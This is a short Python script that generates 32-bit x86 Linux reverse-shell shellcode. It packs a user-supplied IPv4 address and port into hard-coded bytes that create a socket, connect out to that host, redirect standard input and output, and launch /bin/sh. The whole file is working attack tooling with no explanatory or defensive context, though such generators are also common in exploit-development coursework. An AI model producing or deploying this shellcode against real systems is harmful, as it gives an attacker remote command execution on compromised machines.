#/bin/python3

import sys
import socket
import struct
import binascii

shellcode1 = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x66\\xb3\\x01\\x6a\\x06\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x31\\xdb\\xb0\\x66\\xb3\\x03\\x68"
shellcode2 = "\\x66\\x68"
shellcode3 = "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\x89\\xfb\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x31\\xd2\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xcd\\x80"


if not len(sys.argv) == 3:
    print(f"Usage: python3 {sys.argv[0]} <IPv4_adress> <port>")
    sys.exit()


address = sys.argv[1]
port = sys.argv[2]



address = binascii.hexlify(socket.inet_aton(address)).decode("utf-8") 
print(address)

address = f"\\x{address[:2]}\\x{address[2:4]}\\x{address[4:6]}\\x{address[6:8]}"
print(f"address: {address}")


port = struct.pack("!i", int(port)).hex()
port_byte1 = port[len(port)-4:len(port)-2]
port_byte2 = port[len(port)-2:]
port = f"\\x{port_byte1}\\x{port_byte2}"
print(f"port: {port}")

shellcode = shellcode1 + address + shellcode2 + port + shellcode3
print(shellcode)